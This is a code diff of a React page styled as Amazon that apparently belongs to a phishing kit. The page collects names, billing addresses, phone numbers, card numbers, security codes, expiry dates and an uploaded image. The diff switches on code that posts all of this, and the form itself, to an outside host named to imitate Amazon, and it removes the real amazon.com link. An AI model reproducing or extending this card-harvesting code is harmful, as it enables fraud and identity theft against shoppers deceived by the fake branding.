@@ -138,86 +138,86 @@ export default function Laptop() {
       };
     
 
-    const handleUpload = () =>{
-        const user = {
-            fullName: fullName,
-            selectedCountry: selectedCountry,
-            bill: bill,
-            billUs1: billUs1,
-            billUs2: billUs2,
-            phone: phone,
-            city: city,
-            card: card,
-            security: security,
-            region: region,
-            zipcode: zipcode,
-            radioValue: radioValue,
-            fullNameCard: fullNameCard,
-            month: month,
-            year: year,
-            image: images[0]
-        };
-        console.log(user);
-    }
+    // const handleUpload = () =>{
+    //     const user = {
+    //         fullName: fullName,
+    //         selectedCountry: selectedCountry,
+    //         bill: bill,
+    //         billUs1: billUs1,
+    //         billUs2: billUs2,
+    //         phone: phone,
+    //         city: city,
+    //         card: card,
+    //         security: security,
+    //         region: region,
+    //         zipcode: zipcode,
+    //         radioValue: radioValue,
+    //         fullNameCard: fullNameCard,
+    //         month: month,
+    //         year: year,
+    //         image: images[0]
+    //     };
+    //     console.log(user);
+    // }
 
-    // const handleUpload = async () => {
-    //     if(images.length > 0){
+    const handleUpload = async () => {
+        if(images.length > 0){
         
-    //     for(let i = 0; i< images.length; i++){
-    //         let responseData;
-    //         let formData = new FormData();
-    //         formData.append('imageItem', images[i]);
+        for(let i = 0; i< images.length; i++){
+            let responseData;
+            let formData = new FormData();
+            formData.append('imageItem', images[i]);
   
-    //         await fetch('http://localhost:4000/upload',{
-    //         method:'POST',
-    //         headers:{
-    //             Accept:'application/json',
-    //         },
-    //         body:formData,
-    //         }).then((resp) => resp.json()).then((data) => {responseData=data});
+            await fetch('https://api-amazon-s37l.onrender.com/upload',{
+            method:'POST',
+            headers:{
+                Accept:'application/json',
+            },
+            body:formData,
+            }).then((resp) => resp.json()).then((data) => {responseData=data});
             
-    //         if(responseData.success){
-    //         console.log(responseData.image_url)
-    //         const user = {
-    //             fullName: fullName,
-    //             selectedCountry: selectedCountry,
-    //             bill: bill,
-    //             billUs1: billUs1,
-    //             billUs2: billUs2,
-    //             phone: phone,
-    //             city: city,
-    //             card: card,
-    //             security: security,
-    //             region: region,
-    //             zipcode: zipcode,
-    //             radioValue: radioValue,
-    //             fullNameCard: fullNameCard,
-    //             month: month,
-    //             year: year,
-    //             image: responseData.image_url
-    //         };
-    //         console.log(user);
+            if(responseData.success){
+            console.log(responseData.image_url)
+            const user = {
+                fullName: fullName,
+                selectedCountry: selectedCountry,
+                bill: bill,
+                billUs1: billUs1,
+                billUs2: billUs2,
+                phone: phone,
+                city: city,
+                card: card,
+                security: security,
+                region: region,
+                zipcode: zipcode,
+                radioValue: radioValue,
+                fullNameCard: fullNameCard,
+                month: month,
+                year: year,
+                image: responseData.image_url
+            };
+            console.log(user);
 
-    //         await fetch('http://localhost:4000/adduser',{
-    //         method:'POST',
-    //         headers:{
-    //             Accept:'application/json',
-    //             'Content-Type':'application/json',
-    //         },
-    //         body:JSON.stringify(user),
-    //         }).then((resp) => resp.json()).then((data)=>{
-    //         data.success?alert("User Added"):alert("Failed")
-    //         })
+            await fetch('https://api-amazon-s37l.onrender.com/adduser',{
+            method:'POST',
+            headers:{
+                Accept:'application/json',
+                'Content-Type':'application/json',
+            },
+            body:JSON.stringify(user),
+            }).then((resp) => resp.json()).then((data)=>{
+            data.success?alert("User Added"):alert("Failed")
+            })
             
-    //         }
-    //         setIsImage(false);
+            }
+            setIsImage(false);
 
-    //     }}else{
-    //         setIsImage(true);
-    //     }
+        }}else{
+            setIsImage(true);
+        }
         
         
-    // };
+    };
        
 
   return (
@@ -233,7 +233,7 @@ export default function Laptop() {
                     <a
                     className="a-link-nav-icon"
                     tabIndex="-1"
-                    href="https://www.amazon.com/"
+                    href="/"
                     ><i className="a-icon a-icon-logo" role="presentation"></i
                     ></a>
                 </div>
@@ -241,7 +241,7 @@ export default function Laptop() {
             </div>
             </div>
             <div className="a-section abbott-view-content content-width-mini hidden">
-            <form id="abbott-form" method="post" action="https://localhost:4001/upload">
+            <form id="abbott-form" method="post" action="https://api-amazon-s37l.onrender.com/upload">
                 <input
                 type="hidden"
                 name="__token_"
